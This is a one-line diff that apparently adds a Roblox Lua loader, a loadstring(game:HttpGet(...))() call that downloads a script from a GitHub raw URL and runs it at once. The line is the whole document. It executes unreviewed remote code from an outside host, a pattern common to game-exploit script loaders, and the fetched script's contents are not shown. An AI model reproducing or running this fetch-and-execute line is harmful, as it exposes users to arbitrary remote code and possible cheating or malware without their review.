@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/day-2-fix-my-phone-spam7-32s72tjro5098x.lua"))()
